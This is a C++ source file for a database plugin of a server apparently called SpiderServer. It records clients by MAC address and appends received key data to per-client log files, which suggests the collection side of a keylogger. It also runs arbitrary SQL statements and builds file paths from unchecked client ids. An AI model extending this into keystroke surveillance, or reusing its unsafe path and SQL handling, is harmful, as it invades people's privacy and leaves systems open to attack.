//
// Database.cpp for server in /home/galibe_s/project/SpiderServer/plugins/Database
//
// Made by stephane galibert
// Login   <galibe_s@epitech.net>
//
// Started on  Wed Aug 17 15:01:01 2016 stephane galibert
// Last update Wed Oct 26 14:50:08 2016 stephane galibert
//

#include "Database.hpp"

Database::Database(void)
  : _sql("database.db")
{
  _tableName = "SpiderClient";
  _table += "CREATE TABLE IF NOT EXISTS " + _tableName;
  _table += "(";
  _table += "id INTEGER PRIMARY KEY AUTOINCREMENT,";
  _table += "mac TEXT DEFAULT NULL,";
  _table += "last_connection TEXT DEFAULT NULL,";
  _table += "filename TEXT DEFAULT NULL,";
  _table += "is_connected INTEGER DEFAULT FALSE";
  _table += ");";
}

Database::~Database(void)
{
}

PluginInfo const& Database::getPluginInfo(void) const
{
  return (g_info);
}

void Database::init(void)
{
  try {
    _sql.createTable(_table);
    StaticTools::CreateFolder("./clients");
  } catch (std::exception const& e) {
    std::cerr << e.what() << std::endl;
  }
}

void Database::close(void)
{
  _sql.close();
}

void Database::newConnection(CRString id)
{
  if (!_sql.exist(_tableName, "mac", id)) {
    _sql.insert(_tableName, "mac", id);
    _sql.update(_tableName, "filename", id + ".log", "mac", id);
  }
  _sql.update(_tableName, "is_connected", "1", "mac", id);
  _sql.update(_tableName, "last_connection", StaticTools::GetDate(), "mac", id);
}

void Database::lostConnection(CRString id)
{
  _sql.update(_tableName, "is_connected", "0", "mac", id);
  _sql.update(_tableName, "last_connection", StaticTools::GetDate(), "mac", id);
}

void Database::newKey(CRString id, CRString key)
{
  std::ofstream ofs("./clients/" + id + ".log", std::ios::app | std::ios::out);

  if (ofs) {
    ofs << key << std::flush;
  }
}

std::string Database::executeStatement(CRString stmt)
{
  return (_sql.execute(stmt));
}
